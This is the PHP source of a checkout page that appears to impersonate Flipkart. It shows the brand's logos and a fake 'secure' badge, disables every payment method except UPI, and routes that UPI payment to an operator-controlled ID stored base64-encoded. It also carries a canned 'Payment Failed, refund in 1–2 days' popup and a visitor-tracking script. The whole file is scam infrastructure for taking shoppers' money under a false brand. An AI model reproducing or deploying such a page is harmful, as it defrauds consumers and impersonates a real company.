<?php
include('inc/function.php');
$setting = setting($con);
$admin = admin($con);

if (!isset($_GET['product'])) {
  header("Location: index.php");
  exit();
}
$product_slug = $_GET['product'];
$product_data = mysqli_query($con, "SELECT * FROM product WHERE slug='" . mysqli_real_escape_string($con, $product_slug) . "'");
if (mysqli_num_rows($product_data) == 0) {
  header("Location: index.php");
  exit();
}
$product_id_row = mysqli_fetch_array($product_data);
$product = get_product($con, $product_id_row['id']);
$p = $product[0];
$disc = cal_percentage($p['price'], $p['mrp']);
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Payments</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="/assets/css/payment.css">
  <script src="/assets/js/security.js"></script>
</head>

<body>
  <div id="fkPageLoader" class="fk-page-loader">
    <div class="fk-loader-spinner">
      <img src="/images/fliplpogo.png" alt="Loading" width="34" height="34">
    </div>
  </div>
  <div class="header">
    <div class="header-main">
      <svg class="back-icon" viewBox="0 0 24 24" onclick="history.back()">
        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" />
      </svg>
      <div class="header-text">
        <div class="step-text">Step 3 of 3</div>
        <div class="title-text">Payments</div>
      </div>
      <div class="secure-badge">
        <svg style="width:10px;height:10px;fill:#878787" viewBox="0 0 24 24">
          <path
            d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
        </svg>
        100% Secure
      </div>
    </div>
    <div class="price-summary" id="priceSummary">
      <div class="price-header" id="priceSummaryHeader" onclick="togglePrice()" role="button"
        aria-controls="priceDetails" aria-expanded="false">
        <div class="total-label">Total Amount <svg class="arrow-icon" id="priceArrow" viewBox="0 0 24 24">
            <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
          </svg></div>
        <div class="total-value" id="headerAmount">₹<?php echo number_format($p['price'], 0, '.', ','); ?></div>
      </div>
      <div class="price-details" id="priceDetails">
        <div class="payment-product-summary">
          <img class="payment-product-image" src="<?php echo htmlspecialchars(strpos($p['image'], 'http') === 0 ? str_replace(' ', '%20', $p['image']) : PRODUCT_PATH . str_replace(' ', '%20', $p['image'])); ?>" alt="<?php echo htmlspecialchars($p['name']); ?>">
          <div class="payment-product-copy">
            <div class="payment-product-title"><?php echo htmlspecialchars($p['name']); ?></div>
            <div class="payment-product-prices">
              <span class="payment-product-price">₹<?php echo number_format($p['price'], 0, '.', ','); ?></span>
              <span class="payment-product-mrp">₹<?php echo number_format($p['mrp'], 0, '.', ','); ?></span>
            </div>
            <div class="payment-product-delivery">Delivery by: <strong>3 Sep, Thu</strong></div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="offer-section">
    <div class="offer-box">
      <div class="offer-content">
        <div><span class="cashback-glow" data-text="5% Cashback">5% Cashback</span></div>
        <div>Claim now with payment offers</div>
      </div>
      <div style="display:flex;align-items:center">
        <div
          style="width:28px;height:28px;border-radius:50%;background:#fdeaea;display:flex;align-items:center;justify-content:center;border:1px solid #fff;margin-right:8px;overflow:hidden">
          <img src="/images/AXIS.svg" style="width:16px;height:16px;display:block" onerror="this.style.display='none'">
        </div>
        <div
          style="width:28px;height:28px;border-radius:50%;background:#e3f2fd;display:flex;align-items:center;justify-content:center;border:1px solid #fff;overflow:hidden">
          <img src="/images/SBI.svg" style="width:16px;height:16px;display:block" onerror="this.style.display='none'">
        </div>
      </div>
    </div>
  </div>
  <div class="payment-section">
    <div class="method-item" id="upiMethod">
      <div class="method-header" onclick="toggleMethod('upiMethod')">
        <img src="/images/upi.svg" class="method-icon" alt="" onerror="this.style.display='none'">
        <div class="method-info">
          <div class="method-title">UPI</div>
          <div class="method-sub">Pay by any UPI app</div>
        </div>
        <svg class="expand-arrow" viewBox="0 0 24 24">
          <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
        </svg>
      </div>
      <div class="method-body">
        <div class="upi-header-row">
          <div class="upi-header-title">Choose a UPI App</div>
          <img src="/images/upi.svg" class="upi-powered" onerror="this.style.display='none'">
        </div>
        <div class="upi-list">
          <?php if ($setting[0]['pay1'] == '1') { ?>
            <div class="upi-option selected" onclick="selectApp('phonepe')">
              <img src="/images/phonepe.svg" class="upi-logo" onerror="this.src='https://via.placeholder.com/24'">
              <span class="upi-name">PhonePe</span>
              <div class="upi-radio selected" id="rd_phonepe"></div>
            </div>
          <?php } else { ?>
            <div class="upi-option unavailable-option" aria-disabled="true">
              <img src="/images/phonepe.svg" class="upi-logo" onerror="this.src='https://via.placeholder.com/24'">
              <span class="upi-name">PhonePe</span>
              <div class="upi-radio" aria-hidden="true"></div>
            </div>
          <?php } ?>
          <?php if ($setting[0]['pay2'] == '1') { ?>
            <div class="upi-option" onclick="selectApp('gpay')">
              <img src="/images/gpay.svg" class="upi-logo" onerror="this.onerror=null;this.src='/images/gpay_icon.svg'">
              <span class="upi-name">Google Pay</span>
              <div class="upi-radio" id="rd_gpay"></div>
            </div>
          <?php } else { ?>
            <div class="upi-option unavailable-option" aria-disabled="true">
              <img src="/images/gpay.svg" class="upi-logo" onerror="this.onerror=null;this.src='/images/gpay_icon.svg'">
              <span class="upi-name">Google Pay</span>
              <div class="upi-radio" aria-hidden="true"></div>
            </div>
          <?php } ?>
          <?php if ($setting[0]['pay3'] == '1') { ?>
            <div class="upi-option" onclick="selectApp('paytm')">
              <img src="/images/paytm.svg" class="upi-logo" onerror="this.src='https://via.placeholder.com/24'">
              <span class="upi-name">Paytm</span>
              <div class="upi-radio" id="rd_paytm"></div>
            </div>
          <?php } else { ?>
            <div class="upi-option unavailable-option" aria-disabled="true">
              <img src="/images/paytm.svg" class="upi-logo" onerror="this.src='https://via.placeholder.com/24'">
              <span class="upi-name">Paytm</span>
              <div class="upi-radio" aria-hidden="true"></div>
            </div>
          <?php } ?>
          <?php if ($setting[0]['pay4'] == '1') { ?>
            <div class="upi-option" onclick="selectApp('qr')">
              <svg class="upi-logo qr-option-icon" viewBox="0 0 24 24" aria-hidden="true">
                <path
                  d="M3 3h8v8H3zm2 2v4h4V5zm-2 10h8v8H3zm2 2v4h4v-4zm10-14h8v8h-8zm2 2v4h4V5zm-2 10h2v2h-2zm2 2h2v2h-2zm-2 2h2v2h-2zm4-4h2v2h-2zm2 2h2v2h-2zm-4 2h2v2h-2z" />
              </svg>
              <span class="upi-name">QR Code</span>
              <div class="upi-radio" id="rd_qr"></div>
            </div>
          <?php } else { ?>
            <div class="upi-option unavailable-option" aria-disabled="true">
              <svg class="upi-logo qr-option-icon" viewBox="0 0 24 24" aria-hidden="true">
                <path
                  d="M3 3h8v8H3zm2 2v4h4V5zm-2 10h8v8H3zm2 2v4h4v-4zm10-14h8v8h-8zm2 2v4h4V5zm-2 10h2v2h-2zm2 2h2v2h-2zm-2 2h2v2h-2zm4-4h2v2h-2zm2 2h2v2h-2zm-4 2h2v2h-2z" />
              </svg>
              <span class="upi-name">QR Code</span>
              <div class="upi-radio" aria-hidden="true"></div>
            </div>
          <?php } ?>
          <?php if ($setting[0]['pay5'] == '1') { ?>
            <div class="upi-option" onclick="selectApp('all_upi')">
              <img src="https://static-assets.meesho.com/videos/prepaid_icon.gif" class="upi-logo"
                onerror="this.onerror=null;this.src='/images/all-upi.svg'">
              <span class="upi-name">ALL UPI</span>
              <div class="upi-radio" id="rd_all_upi"></div>
            </div>
          <?php } else { ?>
            <div class="upi-option unavailable-option" aria-disabled="true">
              <img src="https://static-assets.meesho.com/videos/prepaid_icon.gif" class="upi-logo"
                onerror="this.onerror=null;this.src='/images/all-upi.svg'">
              <span class="upi-name">ALL UPI</span>
              <div class="upi-radio" aria-hidden="true"></div>
            </div>
          <?php } ?>
        </div>
        <button class="pay-btn" id="payBtn" onclick="processPayment()">Pay <span id="btnAmount">₹<?php echo number_format($p['price'], 0, '.', ','); ?></span></button>
      </div>
    </div>

    <div class="method-item" id="codMethod">
      <div class="method-header">
        <svg class="method-icon" viewBox="0 0 24 24" fill="none">
          <path d="M3 6h18v9H3z" stroke="currentColor" stroke-width="1.6" />
          <path d="M7 15v3M17 15v3" stroke="currentColor" stroke-width="1.6" />
          <circle cx="7" cy="19" r="2" stroke="currentColor" stroke-width="1.6" />
          <circle cx="17" cy="19" r="2" stroke="currentColor" stroke-width="1.6" />
          <path d="M8 9h8" stroke="currentColor" stroke-width="1.6" />
        </svg>
        <div class="method-info">
          <div class="unavailable-row">
            <div class="method-title">Cash on Delivery</div>
            <div class="unavailable-tag">Unavailable <svg style="width:12px;height:12px;fill:#878787;margin-left:4px"
                viewBox="0 0 24 24">
                <path
                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" />
              </svg></div>
          </div>
          <div class="method-sub">Pay by cash or UPI at your doorstep</div>
        </div>
      </div>
    </div>

    <div class="method-item" id="cardMethod">
      <div class="method-header">
        <svg class="method-icon" viewBox="0 0 24 24">
          <path
            d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
        </svg>
        <div class="method-info">
          <div class="unavailable-row">
            <div class="method-title">Credit/Debit/ATM Card</div>
            <div class="unavailable-tag">Unavailable <svg style="width:12px;height:12px;fill:#878787;margin-left:4px"
                viewBox="0 0 24 24">
                <path
                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" />
              </svg></div>
          </div>
          <div class="method-sub">Add and secure cards as per RBI guidelines</div>
          <div class="method-sub" style="color:#007f30;margin-top:2px">Get up to 5% cashback* • 2 offers available</div>
        </div>
      </div>
    </div>

    <div class="method-item" id="nbMethod">
      <div class="method-header">
        <svg class="method-icon" viewBox="0 0 24 24">
          <path d="M4 20h16V8H4v12zm2-9h12v7H6v-7zM2 6h20v2H2V6z" />
        </svg>
        <div class="method-info">
          <div class="unavailable-row">
            <div class="method-title">Net Banking</div>
            <div class="unavailable-tag">Unavailable <svg style="width:12px;height:12px;fill:#878787;margin-left:4px"
                viewBox="0 0 24 24">
                <path
                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" />
              </svg></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="qr-modal-overlay" id="qrModal" aria-hidden="true" onclick="handleQRBackdrop(event)">
    <div class="qr-modal-card" role="dialog" aria-modal="true" aria-label="Flipkart QR payment">
      <div class="qr-modal-header">
        <img src="/images/flipkart.svg" class="qr-modal-logo" alt="Flipkart">
        <button type="button" class="qr-modal-close" onclick="closeQRModal()" aria-label="Close QR code">×</button>
      </div>
      <div class="qr-container">
        <div class="qr-frame">
          <div class="qr-loading" id="qrLoading"><i class="fas fa-spinner fa-spin"></i> Generating secure QR...</div>
          <img id="qrImage" class="qr-image" src="" alt="UPI payment QR code">
        </div>
        <div class="qr-instructions">
          Scan using PhonePe, GPay, Paytm or any UPI app
          <strong class="qr-amount" id="qrAmount">₹<?php echo number_format($p['price'], 0, '.', ','); ?></strong>
        </div>
        <a href="#" class="qr-download-link is-disabled" id="qrDownloadLink" download="upi-payment-qr.png"
          aria-disabled="true" onclick="downloadQR(event)">
          <i class="fas fa-download" aria-hidden="true"></i>
          <span>Download QR Code</span>
        </a>
        <div class="qr-download-note">Download and scan it smoothly from your UPI app gallery.</div>
      </div>
    </div>
  </div>

  <div class="payment-status-overlay" id="paymentWaitingOverlay" aria-hidden="true">
    <div class="payment-status-card" role="status" aria-live="polite">
      <div class="payment-status-spinner">
        <img class="payment-status-logo" id="paymentStatusLogo" src="/images/phonepe.svg" alt="PhonePe">
      </div>
      <div class="payment-popup-title">Processing Payment</div>
      <p class="payment-popup-text">Please complete the payment in your UPI app. Do not close this window.</p>
      <p class="payment-popup-note">Redirecting automatically…</p>
      <button type="button" class="payment-cancel-btn" id="cancelPaymentBtn">Use Different Payment Method</button>
    </div>
  </div>

  <div class="payment-failed-overlay" id="paymentFailedPopup" aria-hidden="true">
    <div class="payment-failed-card" role="alertdialog" aria-modal="true" aria-labelledby="paymentFailedTitle">
      <div class="payment-failed-icon">
        <svg width="38" height="38" viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <path d="M18 6L6 18M6 6L18 18" stroke="#d10000" stroke-width="2.8" stroke-linecap="round" />
        </svg>
      </div>
      <div class="payment-failed-title" id="paymentFailedTitle">Payment Failed</div>
      <p class="payment-failed-text">
        The transaction couldn’t be completed and was declined by your bank.<br><br>
        If any amount was debited, it will be refunded automatically within <strong>1–2 days</strong>.
      </p>
      <button type="button" class="payment-try-btn" id="tryAgainBtn">Try Again</button>
    </div>
  </div>

  <div class="footer">
    <div style="margin-top: 30px; opacity: 0.7; font-size:14px;font-weight:800;margin-bottom:0px">35 Crore happy
      customers<br>and counting!</div>
    <svg class="smile-icon" viewBox="0 0 24 24">
      <path
        d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z" />
    </svg>
  </div>

  <script>
    let totalAmount = <?php echo $p['price']; ?>;
    let itemsPrice = <?php echo $p['price']; ?>;
    let upiId = "<?php echo base64_decode($admin[0]['ip']); ?>";
    const cartSystemEnabled = false;

    const phonepe = `phonepe://pay?pa=${upiId}&pn=Shopping&am=<?php echo $p['price']; ?>&cu=INR&tn=FlipkartShopping`;
  </script>
  <script src="/assets/js/payment.js"></script>
  <script src="/visitor.js" data-page="payment" defer></script>
  <script type="module"
    src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925"
    integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A=="
    data-cf-beacon='{"version":"2024.11.0","token":"0b2008e19fd943c7831b0ee755168137","r":1}'
    crossorigin="anonymous"></script>
</body>

</html>
